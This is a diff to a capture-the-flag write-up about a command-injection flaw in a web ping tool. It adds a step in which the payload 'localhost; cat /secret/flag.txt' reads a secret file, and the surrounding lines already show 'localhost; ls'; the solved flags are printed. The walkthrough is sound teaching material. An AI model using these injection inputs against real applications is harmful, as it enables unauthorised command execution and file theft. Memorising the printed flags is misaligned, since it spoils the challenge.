@@ -30,7 +30,7 @@ we can see that the application is not properly sanitizing user input so we ping
 localhost; ls
 \`\`\`
  
-which returnd the list of files in the current directory, confirming that the application is vulnerable to command injection.
+which return the list of files in the current directory, confirming that the application is vulnerable to command injection.
 
 \`\`\`
 PING localhost (127.0.0.1) 56(84) bytes of data.
@@ -60,6 +60,20 @@ flag2{c0mm4nd_1nj3ct10n_w0rks}
 \`\`\`
 
 Following the instructions in solution.md we cat the secret file and we get the final flag.
+
+\`\`\`
+localhost; cat /secret/flag.txt
+
+PING localhost (127.0.0.1) 56(84) bytes of data.
+64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.022 ms
+64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.048 ms
+64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.037 ms
+
+--- localhost ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2079ms
+rtt min/avg/max/mdev = 0.022/0.035/0.048/0.010 ms
+web{UyCT7MzwDn}
+\`\`\`
 
 \`\`\`
 web{UyCT7MzwDn}
